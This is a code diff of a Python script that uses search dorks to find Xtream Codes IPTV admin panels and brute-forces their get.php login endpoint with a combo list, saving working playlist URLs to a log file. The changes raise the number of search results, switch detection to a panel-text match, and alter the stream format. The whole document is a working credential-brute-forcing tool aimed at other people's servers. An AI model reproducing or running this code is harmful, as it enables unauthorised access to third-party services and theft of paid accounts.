@@ -44,7 +44,7 @@ def extractUrls(dorks):
     temp = []
     urls = []
     for dork in open(dorks, 'r').readlines():
-        for link in search(dork.strip(), max_results=100):
+        for link in search(dork.strip(), max_results=400):
             temp.append(link)
         for url in temp:
             if url not in urls:
@@ -62,14 +62,15 @@ def checkUrls(urls):
 
 def aliveOrNot(urls):
     temp = []
-    print "Hunting URLs for resp.code 200"
+    print "[*] Hunting URLs for Admin panel"
     for url in urls:
         try:
-            if '200' == str(get("http://%s/get.php" %(url), timeout=10).status_code):
-                print "\tURL request code 200 -->> http://%s/" %(url)
+            if "Xtream Codes</a>" in get("http://%s/" %(url), timeout=10).text:
+                print "\tPanel found on URL  -->> http://%s/" %(url)
                 temp.append(url)
         except Exception as e:
-            print "\tURL request code 404 -->> http://%s/" %(url)
+            #print "\tNo Panel found -->> http://%s/" %(url)
+            pass
     print "[i] %s of them are alive!" %(len(temp))
     return temp
     
@@ -78,7 +79,7 @@ def bruteAccounts(urls,comboFile):
         print "[i] Trying URL: http://%s/" %(url)
         for user in tqdm(open(comboFile, 'r').readlines()):
             try:
-                accountToTry = "http://%s/get.php?username=%s&password=%s&type=m3u&output=mpegts" %(url.strip(), user.strip(), user.strip())
+                accountToTry = "http://%s/get.php?username=%s&password=%s&type=m3u&output=ts" %(url.strip(), user.strip(), user.strip())
                 if "#EXTINF:0" in get(accountToTry, timeout=5, stream=True).text:
                     print "[+] Playlist URL found: %s" %(accountToTry)
                     f = open("logs.txt", "w")
